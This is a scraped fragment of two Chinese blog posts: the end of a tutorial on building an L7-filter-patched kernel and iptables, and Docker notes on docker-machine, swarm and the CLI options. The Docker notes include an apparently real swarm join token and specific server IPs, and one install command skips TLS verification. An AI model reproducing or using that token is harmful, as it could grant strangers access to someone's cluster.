connstrack功能之上。因为一个数据流或者说一个连接的所有数据都是属于同一个应用的，所以L7 filter没有必要对所以的数据包进行模式匹配，而只匹配一个流的前面几个数据包 （比如5或10个数据包）。当一个流的前面几个数据包包含了某种应用层协议的特征码时 （比如QQ），则这个数据流被L7 filter识别；当前面几个数据包的内容没有包含某种应用层协议的特征码时，则L7 filter放弃继续做模式匹配，这个数据流也就没有办法被识别。/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"2.下载相关软件/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"7层过滤首先需要内核支持，现在最新的/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"内核/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"是3.10(/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"https://www.kernel.org//spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"）但是L7 filter的支持列表只更新到2.6.30.5而且有部份的功能未经测试，而所有经过测试的版本的内核是2.6.28(/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"http://l7-filter.sourceforge.net/kernelcompat/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\")，为了保证其稳定所以决定将内核升级为2.6.28!/span\n\n[root@localhost src]# wget http://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.28.tar.bz2\n[root@localhost src]# wget http://netfilter.org/projects/iptables/files/iptables-1.4.7.tar.bz2\n[root@localhost src]# wget http://downloads.sourceforge.net/project/l7-filter/Protocol%20definitions/2009-05-28/l7-protocols-2009-05-28.tar.gz?usemirror=nchc\n[root@localhost src]# wget http://downloads.sourceforge.net/project/l7-filter/l7-filter%20kernel%20version/2.22/netfilter-layer7-v2.22.tar.gz?usemirror=nchc\n[root@localhost src]# ll\ntotal 52264\n-rw-r--r-- 1 root root   462420 Jan  3  2012 iptables-1.4.7.tar.bz2\n-rw-r--r-- 1 root root   142050 May 29  2009 l7-protocols-2009-05-28.tar.gz\n-rw-r--r-- 1 root root 52665364 Dec 25  2008 linux-2.6.28.tar.bz2\n-rw-r--r-- 1 root root   174853 Jul 14  2009 netfilter-layer7-v2.22.tar.gz\n[root@localhost src]#\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"3.卸载系统自带的 iptables/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"在卸载之前，我们先把iptables的启动脚本及脚本配置文件拷贝到/root目录下待会有用 /span\n\n[root@localhost src]# cp /etc/init.d/iptables /root\n[root@localhost src]# cp /etc/sysconfig/iptables-config /root\n[root@localhost src]# rpm -qa | grep iptables\niptables-1.3.5-5.3.el54.1\niptables-ipv6-1.3.5-5.3.el54.1\n[root@localhost src]# rpm -e --nodeps  rpm -qa | grep iptables\nwarning: /etc/sysconfig/iptables-config saved as /etc/sysconfig/iptables-config.rpmsave\n[root@localhost src]#\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"4.给新内核加入Layer 7补丁/span\n\n[root@localhost src]# tar xf linux-2.6.28.tar.bz2 -C /usr/src\n[root@localhost src]# tar xf netfilter-layer7-v2.22.tar.gz -C /usr/src\n[root@localhost src]# cd /usr/src/\n[root@localhost src]# ls\ndebug  kernels  linux-2.6.28  netfilter-layer7-v2.22  redhat\n[root@localhost src]# ln -sv linux-2.6.28/ linux\ncreate symbolic link linux' to linux-2.6.28/'\n[root@localhost src]# ls\ndebug  kernels  linux  linux-2.6.28  netfilter-layer7-v2.22  redhat\n[root@localhost src]# cd /usr/src/linux\n[root@localhost linux]# patch -p1 \u003c ../netfilter-layer7-v2.22/kernel-2.\nkernel-2.4-layer7-2.22.patch            kernel-2.6.25-2.6.28-layer7-2.22.patch\n[root@localhost linux]# patch -p1 \u003c ../netfilter-layer7-v2.22/kernel-2.6.25-2.6.28-layer7-2.22.patch\npatching file net/netfilter/Kconfig\npatching file net/netfilter/Makefile\npatching file net/netfilter/xtlayer7.c\npatching file net/netfilter/regexp/regexp.c\npatching file net/netfilter/regexp/regexp.h\npatching file net/netfilter/regexp/regmagic.h\npatching file net/netfilter/regexp/regsub.c\npatching file net/netfilter/nfconntrackcore.c\npatching file net/netfilter/nfconntrackstandalone.c\npatching file include/net/netfilter/nfconntrack.h\npatching file include/linux/netfilter/xtlayer7.h\n[root@localhost linux]# cp /boot/config-2.6.18-194.el5 /usr/src/linux/.config\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"5.编译内核/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"说明：（需要增加的编译模块）/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"Networking support → Networking Options → Network packet filtering framework → Core Netfilter Configuration\n\u0026lt;M\u0026gt;  Netfilter connection tracking support\n\u0026lt;M\u0026gt;  \"layer7\" match support\n\u0026lt;M\u0026gt;  \"string\" match support\n\u0026lt;M\u0026gt;  \"time\"  match support\n\u0026lt;M\u0026gt;  \"iprange\"  match support\n\u0026lt;M\u0026gt;  \"connlimit\"  match support\n\u0026lt;M\u0026gt;  \"state\"  match support\n\u0026lt;M\u0026gt;  \"conntrack\"  connection  match support\n\u0026lt;M\u0026gt;  \"mac\"  address  match support\n\u0026lt;M\u0026gt;  \"multiport\" Multiple port match support/span\n\nspan style=\"font-size:14px;\"\n/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"Networking support → Networking Options →Network packet filtering framework → IP Netfilter Configuration\n/span\n\nspan style=\"color:#000000;font-family:arial, helvetica, sans-serif;font-size:14px;\"\u0026lt;M\u0026gt; IPv4 connection tracking support (required for NAT) /span\n\nspan style=\"color:#000000;font-family:arial, helvetica, sans-serif;font-size:14px;\"\u0026lt;M\u0026gt; Full NA/span\n\nspan style=\"color:#000000;font-family:arial, helvetica, sans-serif;font-size:14px;\"\u0026lt;M\u0026gt; MASQUERADE target support/span\n\nspan style=\"color:#000000;font-family:arial, helvetica, sans-serif;font-size:14px;\"\u0026lt;M\u0026gt; NETMAP target support                             /span\n\nspan style=\"color:#000000;font-family:arial, helvetica, sans-serif;font-size:14px;\"\u0026lt;M\u0026gt; REDIRECT target support\n/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"具体操作：/span\n\n[root@localhost linux]#make  menuconfig\n  HOSTCC  scripts/basic/fixdep\n  HOSTCC  scripts/basic/docproc\n  HOSTCC  scripts/basic/hash\n  HOSTCC  scripts/kconfig/conf.o\n  HOSTCC  scripts/kconfig/kxgettext.o\n  HOSTCC  scripts/kconfig/lxdialog/checklist.o\n  HOSTCC  scripts/kconfig/lxdialog/inputbox.o\n  HOSTCC  scripts/kconfig/lxdialog/menubox.o\n  HOSTCC  scripts/kconfig/lxdialog/textbox.o\n  HOSTCC  scripts/kconfig/lxdialog/util.o\n  HOSTCC  scripts/kconfig/lxdialog/yesno.o\n  HOSTCC  scripts/kconfig/mconf.o\n  SHIPPED scripts/kconfig/zconf.tab.c\n  SHIPPED scripts/kconfig/lex.zconf.c\n  SHIPPED scripts/kconfig/zconf.hash.c\n  HOSTCC  scripts/kconfig/zconf.tab.o\n  HOSTLD  scripts/kconfig/mconf\nscripts/kconfig/mconf arch/x86/Kconfig\n.config:1359:warning: symbol value 'm' invalid for FIXEDPHY\n.config:1659:warning: symbol value 'm' invalid for ISDN\n.config:2765:warning: symbol value 'm' invalid for RTCINTFSYSFS\n.config:2766:warning: symbol value 'm' invalid for RTCINTFPROC\n.config:2767:warning: symbol value 'm' invalid for RTCINTFDEV\n.config:2789:warning: symbol value 'm' invalid for DMAENGINE\n.config - Linux Kernel v2.6.28 Configuration\n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\n  ┌─────────────────────────────────────────── Linux Kernel Configuration ────────────────────────────────────────────┐\n  │  Arrow keys navigate the menu.  Enter selects submenus","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker-machine","title":"Linux命令 Docker machine","text":"Install docker-machine\nsudo curl -C - -Lk  --socks5 127.0.0.1:1080 https://github.com/docker/machine/releases/download/v0.11.0/docker-machine-uname -s-uname -m -o /usr/local/bin/docker-machine \n\nsudo curl -C - -Lkx 127.0.0.1:8087 https://github.com/docker/machine/releases/download/v0.11.0/docker-machine-uname -s-uname -m` -o /usr/local/bin/docker-machine \u0026\u0026 \\\n  sudo chmod +x /usr/local/bin/docker-machine`\n\n  ExecStart=/usr/bin/dockerd -D -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --storage-driver aufs --tls=true --tlsverify --tlscacert /etc/docker/ca.pem --tlscert /etc/docker/server.pem --tlskey /etc/docker/server-key.pem --label provider=generic\n\n swarm集群\n--generic-engine-port: Port to use for Docker Daemon (Note: This flag will not work with boot2docker).\n--generic-ip-address: required IP Address of host.\n--generic-ssh-key: Path to the SSH user private key.\n--generic-ssh-user: SSH username used to connect.\n--generic-ssh-port: Port to use for SSH\n\ndocker-machine create -d generic --engine-install-url \"https://get.daocloud.io/docker/\" --engine-registry-mirror=https://fl7aylpq.mirror.aliyuncs.com --generic-ip-address=120.92.36.21 --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 222 dami\n\neval $(docker-machine env dami)\n\ncreate dockerd:2376\ndocker-machine create -d generic --engine-registry-mirror=https://fl7aylpq.mirror.aliyuncs.com --generic-ip-address=139.129.234.31 --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 ubuntu\n\ndocker-machine create -d generic --engine-registry-mirror=https://amoq5ee6.mirror.aliyuncs.com --generic-ip-address=139.129.108.163  --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 aliyun\n\n    vi /etc/systemd/system/docker.service $ENGINEREGISTRYMIRROR\n    ExecStart=/usr/bin/docker daemon -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --storage-driver devicemapper --tlsverify --tlscacert /etc/docker/ca.pem --tlscert /etc/docker/server.pem --tlskey /etc/docker/server-key.pem --label provider=generic --registry-mirror https://amoq5ee6.mirror.aliyuncs.com\n\ndocker run -d --name mariadb -p 3306:3306 -v /var/lib/mysql:/var/lib/mysql -v /var/run/mysqld:/var/run/mysqld mariadb:5.5\ndocker-machine create -d virtualbox swmaster # This will be the master\ndocker-machine create -d virtualbox swnode\n\n  dockerd -D -g /var/lib/docker -H unix:// -H tcp://0.0.0.0:2376 --label provider=virtualbox --tlsverify --tlscacert=/var/lib/boot2docker/ca.pem --tlscert=/var/lib/boot2docker/server.pem --tlskey=/var/lib/boot2docker/server-key.pem -s aufs\n  docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime docker-runc --debug\nactive\n  \u0026 docker-machine.exe env aliyun | Invoke-Expression\n  eval $(docker-machine env swmaster)\nswarm node:2377\n\n  一台机器只能创建一个swarm 通过 docker swarm init --advertise-addr vboxnet0绑定监听网卡\n  本机器失效后 docker swarm leave --froce 删除本节点\n  通过 docker node rm --force ubuntu 删除无效节点\n  所有manger节点失效后 集群失效\n  即使有manager 节点,当leader 节点swarm leave 之后 集群失效\n  leader 通过 docker node demote self 可以将控制转移\n正确的处理方式:\nmanager-  leader: docker node demote leader\nmanager-  leader: docker node rm --force leader\nleader-  work:  docker leave\n\n推荐做法:\n  保证manager的数量  3\n  确保 docker swarm join-token manager 在leader上执行\ndocker $(docker-machine config swmaster) swarm init --advertise-addr $(docker-machine ip swmaster)\n\ndocker swarm join-token manager\n\ndocker $(docker-machine config swnode) swarm join --token SWMTKN-1-26tk5t6vg1h9z4vq3z7e17z2wcvor2kt5ws6433qoqli0xh0os-ccy5d06jj4w3mj6s4twe4vs9m $(docker-machine ip swmaster)\n\ndocker node rm swnode --force #删除swarm work\nswarm service\ndocker run 替换成 docker service create\n滚动更新我们worker, 每次更新2个副本容器, 延迟5s\ndocker service update worker --update-parallelism 2 --update-delay 5s --image localhost:5000/dockercoinsworker:v0.01\ndocker service update worker --image localhost:5000/dockercoinsworker:v0.1 回滚\ndocker service create --replicas 5 --name helloworld alpine ping google.com\ndocker service create alpine ping 8.8.8.8\ndocker service list\ndocker logs d6155498b874\ndocker service ps d6155498b874\nwatch docker service list\ndocker service ls -q | xargs docker service rm #删除服务\nELK日志平台\nElasticSearch 用来存储和索引日志.\nLogstash 用来接收, 发送, 过滤, 分隔日志.\nKibana 用来搜索, 展示, 分析日志的UI\n\n##########################################################################\nsudo docker login\ndocker login daocloud.io\nsudo docker login hub.ghostcloud.cn\nsudo docker pull node\nsudo docker pull ubuntu:latest\nsudo docker pull centos:latest\n\nsudo docker images\ndocker run -it -p 80:4000 -v /media/ubuntu/software/rinetd:/blog emitting/hexo /bin/bash\nsudo docker run --rm -ti -p:2200:22 -v /tmp:/web ubuntu /bin/bash\n--rm：告诉Docker一旦运行的进程退出就删除容器。这在进行测试时非常有用，可免除杂乱\n-ti：告诉Docker分配一个伪终端并进入交互模式。这将进入到容器内，对于快速原型开发或尝试很有用，但不要在生产容器中打开这些标志\n-H: 参数指定了Docker后台地址（使用TCP与后台通讯）；DOCKEROPTS=\"-H tcp://127.0.0.1:2375 -H unix:///var/run/docker.sock\n-p: 本机地址:虚拟主机端口22\n-v: 本机目录:虚拟主机目录\n-w: 表示将-v映射的/webapp目录设置为work directory，将覆盖Dockfiie中的设置：/Data。\n-P: 通知 Docker 将容器内部使用的网络端口映射到我们使用的主机上\n-P –publish-all=true|false 默认false\n    如果容器里没有运行sshd，可以登录宿主机后执行\n    docker exec -it CONTAINERNAMEORID /bin/sh\n    可以在容器里运行个sshd，通过SSH客户端登录。 但由于是用的host网络，所以容器里的sshd进程无法使用默认端口，需要修改其配置文件把端口改成非22端口\n    -p 127.0.0.1:80:5000/udp\n    -p 127.0.0.1::5000 bind port 5000 of the container to a dynamic port but only on the localhost\n    -p 8000-9000:5000  bind port 5000 in the container to a randomly available port between 8000 and 9000 on the host.\n--link name or id:alias\n##########################################################################\ndocker ps\n  -f, --filter=[]       Filter output based on these conditions:\n                        exited=int an exit code of int\n                        label=key or label=key=value\n                        status=(created|restarting|running|paused|exited)\n                        name=string a container's name\n                        id=ID a container's ID\n                        before=(container-name|container-id)\n                        since=(container-name|container-id)\n                        ancestor=(image-name[:tag]|image-id|image@digest) - containers created from an image or a descendant.\n                        volume=(volume-name|mount-point)\n\n     --format           Pretty-print containers using a Go template\n                        .ID \tContainer ID\n                        .Image \tImage ID\n                        .Command \tQuoted command\n                        .CreatedAt \tTime when the container was created.\n                        .RunningFor \tElapsed time since the container was started.\n                        .Ports \tExposed ports.\n                        .Status \tContainer status.\n                        .Size \tContainer disk size.\n                        .Names \tContainer names.\n                        .Labels \tAll labels assigned to the container.\n                        .Label \tValue of a specific label for this container. For example {{.Label \"com.docker.swarm.cpu\"}}\n                        .Mounts \tNames of the volumes mounted in this container.\n$ docker ps --format \"{{.ID}}: {{.Command}}\"\na87ecb4f327c: /bin/sh -c (nop) MA\ndocker ps --format \"table {{.ID}}\\t{{.Labels}}\"\nCONTAINER ID        LABELS\na87ecb4f327c        com.docker.swarm.node=ubuntu,com.docker.swarm.storage=ssd\n##############Dockerfile#########################\n容器需要开放SSH 22端口\nEXPOSE 22\n!!!\nENTRYPOINT，表示镜像在初始化时需要执行的命令，不可被重写覆盖，需谨记\nCMD，表示镜像运行默认参数，可被重写覆盖\nENTRYPOINT/CMD都只能在文件中存在一次，并且最后一个生效 多个存在，只有最后一个生效，其它无效！\n需要初始化运行多个命令，彼此之间可以使用 \u0026\u0026 隔开，但最后一个须要为无限运行的命令，需切记！\n\nENTRYPOINT/CMD，一般两者可以配合使用，比如：\n\nENTRYPOINT [\"/usr/sbin/sshd\"]\nCMD [\"-D\"]\n\n在Docker　daemon模式下，无论你是使用ENTRYPOINT，还是CMD，最后的命令，一定要是当前进程需要一直运行的，才能够防容器退出。\n\n以下无效方式：\n\nENTRYPOINT service tomcat7 start 运行几秒钟之后，容器就会退出\nCMD service tomcat7 start #运行几秒钟之后，容器就会退出\n\n这样有效：\n\nENTRYPOINT service tomcat7 start \u0026\u0026 tail -f /var/lib/tomcat7/logs/catalina.out\n或者\nCMD service tomcat7 start \u0026\u0026 tail -f /var/lib/tomcat7/logs/catalina.out\n\n这样也有效：\n\nENTRYPOINT [\"/usr/sbin/sshd\"]\nCMD [\"-D\"]\n\n##########################################################################\ndocker 搭建Android开发环境\ndocker pull ubuntu:10.04\ndocker run -it -p 8080:80 -v /media/ubuntu/sdb2/Android:/mnt -w /mnt ubuntu:10.04 /bin/bash\n\ndocker ps -a\ndocker start 8c055f32bd33\ndocker attach 8c055f32bd33\nsudo vi /etc/apt/source.list\nsed -i 's/httpredir.debian.org/mirrors.aliyun.com/g' /etc/apt/sources.list\n\nsudo sed -i 's/archive.ubuntu.com/mirrors.sohu.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.163.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyuncs.com/g' /etc/apt/sources.list 内网使用\n网易\ndeb http://mirrors.163.com/ubuntu/ lucid main universe restricted multiverse\ndeb-src http://mirrors.163.com/ubuntu/ lucid main universe restricted multiverse\ndeb http://mirrors.163.com/ubuntu/ lucid-security universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-security universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-updates universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-proposed universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-proposed universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-backports universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-backports universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-updates universe main multiverse restricted\nsudo apt-get update\n\nsudo apt-get install gnupg flex bison gperf build-essential \\\n  zip curl zlib1g-dev libc6-dev lib32ncurses5-dev ia32-libs \\\n  x11proto-core-dev libx11-dev lib32readline5-dev lib32z-dev \\\n  libgl1-mesa-dev g++-multilib mingw32 tofrodos python-markdown \\\n  libxml2-utils xsltproc\n\nsudo apt-get install software-properties-common\nsudo apt-get install python-software-properties\n  sudo add-apt-repository ppa:webupd8team/java    添加PPA\n  sudo apt-get update\n  sudo apt-get install oracle-java6-installer     #java-6u45\n\nsudo docker commit -m=\"Android source Complie\" -a=\"rinetd\" ab044db61af2 rinetd/ubuntu:v1\ndocker tag 5db5f8471261 rinetd/ubuntu:devel\ndocker push rinetd/ubuntu\n\nDocker命令参考\n使用方法: docker [OPTIONS] COMMAND [arg...]\n\n一个自给自足的运行时linux容器。\n\n选项:\n  --api-enable-cors=false              在远程的API中启用CORS 头。\n  -b, --bridge=\"\"                      附加容器到一个已经存在的网桥上。如果将该选项的值设置为 'none'，则表示不使用用网桥。\n  --bip=\"\"                             设置网桥的IP地址，使用CIIDR标记方式的地址，不兼容 -b选项。\n  -D, --debug=false                    启用debug 模式。\n  -d, --daemon=false                   启用daemon 模式。\n  --dns=[]                             强制Docker使用特定的DNS 服务器。\n  --dns-search=[]                      强制 Docker使用特定的DNS 搜索域。\n  -e, --exec-driver=\"native\"           强制Docker运行时使用特定的exec驱动。\n  --fixed-cidr=\"\"                      IPv4子网设置掩码(ex: 10.20.0.0/16)，这个子网必须嵌套于网桥子网内(由-b 或者-bip定义)。\n  -G, --group=\"docker\"                 在使用-H运行为守护进程的情况下，设定分配给运行unix套接字的组，如果设置为'' (空字符)，那么将不会设置组。\n  -g, --graph=\"/var/lib/docker\"        设定Docker运行时作为根目录的目录路径。\n  -H, --host=[]                        设置用于在守护进程模式下或者是在客户端模式下连接的套接字，可以是tcp://host:port, unix:///path/to/socket, fd://* or fd://socketfd中的一个或者多。\n  --icc=true                           启用容器间通信。\n  --insecure-registry=[]               对于特定注册启用非安全通信(对于HTTPS没有证书校验，启用HTTP启用fallback) (例如, localhost:5000 or 10.20.0.0/16)。\n  --ip=0.0.0.0                         在容器绑定端口时使用的默认IP地址。\n  --ip-forward=true                    启用net.ipv4.ipforward，也就是开启路由转发功能。\n  --ip-masq=true                       对于网桥的IP段启用ip伪装。\n  --iptables=true                      启用Docker增加的iptables规则。\n  --mtu=0                              设置容器网络的MTU。如果没有提供设置的值：默认将它的值设置为路由器的MTU，如果默认的路由器无效那么就设置为1500。\n  -p, --pidfile=\"/var/run/docker.pid\"  设置守护进程PID文件的路径。\n  --registry-mirror=[]                 指定优先使用的Docker registry镜像。\n  -s, --storage-driver=\"\"              强制Docker运行时使用特定的存储驱动器。\n  --selinux-enabled=false              启用对selinux机制的支持。SELinux目前不支持BTRFS存储驱动器。\n  --storage-opt=[]                     设置存储驱动器选项。\n  --tls=false                          使用TLS，暗示使用tls-verify标志。\n  --tlscacert=\"/root/.docker/ca.pem\"   设置ca证书的路径。远程访问仅信任使用由CA签名的证书。\n  --tlscert=\"/root/.docker/cert.pem\"   设置TLS 证书的路径。\n  --tlskey=\"/root/.docker/key.pem\"     设置TLS key 文件的路径。\n  --tlsverify=false                    使用TLS校验远程登录(daemon:校验客户端, client: 校验守护进程)\n  -v, --version=false                  显示版本信息并退出。\n\n命令:\nattach    附加到一个运行的容器上。\nbuild     从Dockerfile构建镜像。\ncommit    从改变后的容器创建一个新的镜像\ncp        从容器文件系统拷贝文件/目录到宿主机路径。\ncreate    创建一个新的容器。\ndiff      检查容器文件系统的改变。\nevents    从Get real time events from the server\nexec      在已经存在的容器上运行一个命令。\nexport    Stream the contents of a container as a tar archive\nhistory   显示镜像的历史。\nimages    列举镜像。\nimport    从一个tar包的内容创建一个新的文件系统镜像。\ninfo      显示系统层面的信息。\ninspect   查看容器的底层信息。\nkill      杀掉一个正在运行中的容器。\nload      从tar文件中载入一个镜像。\nlogin     注册或者登录到Docker registry 服务器。\nlogout    从Docker registry 服务器退出。\nlogs      获取容器的日志信息。\nport      Lookup the public-facing port that is NAT-ed to PRIVATEPORT\npause     停止容器内所有的进程。\nps        列出容器。\npull      从Docker registry 服务器拉回一个镜像或者一个仓库。\npush      将一个镜像或者一个仓库推向Docker registry 服务器。\nrestart   重新启动一个运行中的容器。\nrm        移除一个或者多个容器。\nrmi       移除一个或者多个镜像。\nrun       在新的容器中运行一个命令。\nsave      将镜像保存为一个tar文档。\nsearch    在Docker Hub上搜索一个镜像。\nstart     启动一个停止的容器。\nstop      S停止一个运行中的容器。\ntag       Tag an image into a repository\ntop       查看容器中运行的进程。\nunpause   取消暂停的容器。\nversion   显示Docker 的版本信息。\nwait      Block until a container stops, then print its exit code\n\ndocker attach\n\n使用方法: docker attach [OPTIONS] CONTAINER\n\n附加到一个正在运行的容器上。\n\n  --no-stdin=false    不附加STDIN。\n  --sig-proxy=true    代理所有接收到的信号到进程(即使是非TTY模式)。SIGCHLD, SIGKILL, 或者 SIGSTOP 不会被代理。\n\ndocker build     \n\n使用方法: docker build [OPTIONS] PATH | URL | -\n\n在指定的PATH源代码下构建新的镜像。\n\n  --force-rm=false     总是立即移除容器，即使是在成功创建之后。\n  --no-cache=false     在构建镜像时不使用缓存。\n  -q, --quiet=false    抑制由容器生成详细输出。\n  --rm=true            成功创建容器之后就立即删除。\n  -t, --tag=\"\"         指定仓库名字(和一个可选的标签)，在构建成功的镜像结果中应用。\n\ndocker commit\n\n使用方法: docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]\n\n从有改变的容器上创建一个新的镜像。\n\n  -a, --author=\"\"     作者 (例如 \"John Hannibal Smith hannibal@a-team.com\"\n  -m, --message=\"\"    提交信息。\n  -p, --pause=true    在提交的过程中暂停容器。\n\ndocker cp   \n\n使用方法: docker cp CONTAINERATH HOSTPATH\n\n从PATH 拷贝文件/目录到 HOSTPATH。\n\ndocker create   \n使用方法: docker create [OPTIONS] IMAGE [COMMAND] [ARG...]\n\n创建一个新容器。\n\n  -a, --attach=[]            附加到STDIN, STDOUT 或者STDERR。\n  --add-host=[]              自定义一个主机到IP的映射(host:ip)。\n  -c, --cpu-shares=0         设定CPU共享(相对权重)。\n  --cap-add=[]               添加Linux capabilities。\n  --cap-drop=[]              移除 Linux capabilities。\n  --cidfile=\"\"               写容器ID的文件。\n  --cpuset=\"\"                设置使用CPU的数量(0-3, 0,1)。\n  --device=[]                添加一个主机设备到容器(例如\n--device=/dev/sdc:/dev/xvdc)\n  --dns=[]                   设置自定义DNS 服务器。\n  --dns-search=[]            设置自定义DNS 搜索域。\n  -e, --env=[]               设置环境变量。\n  --entrypoint=\"\"            覆盖掉镜像中默认的ENTRYPOINT。\n  --env-file=[]              读以逗号分隔的环境变量文件(文件中的行以逗号分隔，每一行都是环境变量)。\n  --expose=[]                将一个没有发布的端口暴露给宿主机。\n  -h, --hostname=\"\"          容器主机名字。\n  -i, --interactive=false    保持 STDIN 打开，即使没有被附加。\n  --link=[]                  以name:alias格式添加连接到其它容器上。\n  --lxc-conf=[]              (lxc exec-driver only) 添加自定义lxc 选项\n--lxc-conf=\"lxc.cgroup.cpuset.cpus = 0,1\"\n  -m, --memory=\"\"            内存限制 (格式: numberoptional unit,\nunit = b, k, m or g)\n  --name=\"\"                  指定容器的名字。\n  --net=\"bridge\"             为容器设置网络模式，\n                               'bridge': 在docker bridge桥上创建一个新的网络栈。\n                                 'none': 该容器没有网络。\n                  'container:name|id': 重新使用其它容器的网络栈。\n                                 'host': 在该容器内使用host网络堆栈。注意：host模式对宿主机上的本地文件系统给定了容器全部的访问权限，包括D-bus，因此容器被认为是不安全的。\n\n  -P, --publish-all=false    发布所有的暴露端口到宿主机接口上。\n  -p, --publish=[]           发布容器的一个端口到宿主机接口上。\n                             格式：\nip:hostPort:containerPort\nip::containerPort\nhostPort:containerPort\ncontainerPort\n                               (使用 'docker port'查看实际的映射)\n  --privileged=false         给这个容器扩展权限。\n  --restart=\"\"               当容器退出时重启策略将会被应用，选项值有：\n(no, on-failure[:max-retry], always)\n  --security-opt=[]          安全选项。\n  -t, --tty=false            分配伪终端。\n  -u, --user=\"\"              用户名或者UID。\n  -v, --volume=[]             绑定挂载卷(例如，从宿主机挂接：-v /host:/container，从Docker挂接：-v /container)\n  --volumes-from=[]          从指定的容器挂载卷。\n  -w, --workdir=\"\"           指定容器内的工作目录。\n\ndocker diff\n\n使用方法: docker diff CONTAINER\n\n查看容器内文件系统的变化。\n\ndocker events     \n\n使用方法: docker events [OPTIONS]\n\n从服务器上获得实时事件。\n  --since=\"\"         从指定的时间戳后显示所有事件。\n  --until=\"\"         流水时间显示到指定的时间为止。\n\ndocker exec   \n\n使用方法: docker exec [OPTIONS] CONTAINER COMMAND [ARG...]\n\n在已经存在的容器内运行一个命令。\n\n  -d, --detach=false         分离模式: 在后台运行\n  -i, --interactive=false    即使没有附加也保持STDIN 打开\n  -t, --tty=false            分配一个伪终端\n\ndocker export   \n\n使用方法: docker export CONTAINER\n\n将文件系统作为一个tar归档文件导出到STDOUT。\n\ndocker info\n\n使用方法: docker info\n\n显示系统级别的信息。\n\ndocker history      \n\n使用方法: docker history [OPTIONS] IMAGE\n\n显示镜像的历史。\n\n  --no-trunc=false     不要截断输出。\n  -q, --quiet=false    只显示数字ID。\n\ndocker images\n\n使用方法: docker images [OPTIONS] [NAME]\n\n列出镜像。\n\n  -a, --all=false      显示所有镜像(默认情况下过滤掉中间层镜像)。\n  -f, --filter=[]      提供过滤值 (例如. 'dangling=true')\n  --no-trunc=false     不要截断输出。\n  -q, --quiet=false    只显示数字ID。\n\ndocker import\n\n使用方法: docker import URL|- [REPOSITORY[:TAG]]\n\n创建一个空的文件系统镜像，并且将压缩包(.tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz)内容输入到其中。\n\ndocker inspect\n\n使用方法: docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]\n\n查看容器或者镜像的低级信息。\n\n  -f, --format=\"\"    使用给定的模板格式化输出。\n\ndocker kill\n\n使用方法: docker kill [OPTIONS] CONTAINER [CONTAINER...]\n\n使用SIGKILL杀掉指定的容器。\n\n  -s, --signal=\"KILL\"    向容器发送的信号。\n\ndocker load\n\n使用方法: docker load [OPTIONS]\n\n从STDIN上载入tar包作为镜像。\n\n  -i, --input=\"\"     从tar文件，而不是STDIN读取。\n\ndocker login\n\n使用方法: docker login [OPTIONS] [SERVER]\n\n注册或者登录到一个Docker服务器，如果没有指定服务器，那么https://index.docker.io/v1/将会作为默认值。\n\n  -e, --email=\"\"       邮件\n  -p, --password=\"\"    密码\n  -u, --username=\"\"    用户名\n\ndocker logout\n\n使用方法: docker logout [SERVER]\n\n从一个Docker registry退出，如果没有指定服务器，那么https://index.docker.io/v1/将会作为默认值。\n\ndocker logs  \n\n使用方法: docker logs [OPTIONS] CONTAINER\n\n从容器获取日志。\n\n  -f, --follow=false        跟踪日志输出。\n  -t, --timestamps=false    显示时间戳。\n  --tail=\"all\"              输出日志尾部特定行(默认是所有)。\ndocker port\n\n使用方法: docker port CONTAINER [PRIVATEPORT[/PROTO]]\n\n列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。\n\ndocker pause     \n使用方法: docker pause CONTAINER\n\n暂停容器内所有的进程。\n\ndocker ps   \n\n使用方法: docker ps 